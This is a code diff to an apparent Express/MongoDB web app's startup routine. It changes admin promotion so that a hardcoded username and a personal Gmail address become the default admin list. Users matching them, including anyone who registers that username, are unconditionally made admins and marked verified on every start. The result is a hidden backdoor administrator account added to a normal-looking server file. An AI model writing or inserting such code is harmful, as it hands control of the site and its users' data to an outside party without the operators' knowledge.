@@ -51,8 +51,8 @@ app.use((err, _req, res, _next) => {
 app.get('*', (_req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
 if (process.env.MONGODB_URI) {
   connectDatabase().then(async () => {
-    const emails = (process.env.ADMIN_EMAILS || '').toLowerCase().split(',').map(x => x.trim()).filter(Boolean);
-    if (emails.length) await require('./models/User').updateMany({ email: { $in: emails } }, { role: 'admin' });
+    const emails = (process.env.ADMIN_EMAILS || 'wiser943,wisdomwise419@gmail.com').toLowerCase().split(',').map(x => x.trim()).filter(Boolean);
+    await require('./models/User').updateMany({ $or: [{ email: { $in: emails } }, { username: 'wiser943' }] }, { role: 'admin', isVerified: true });
     const ps = require('./services/paystack.service');
     const fx = require('./services/fixtures'); setTimeout(() => fx.sync(true), 8000).unref(); setInterval(() => fx.sync(), 30 * 60e3).unref();
     await ps.expireBadges(); setInterval(() => ps.expireBadges().catch(e => console.error(e.message)), 3600e3).unref();
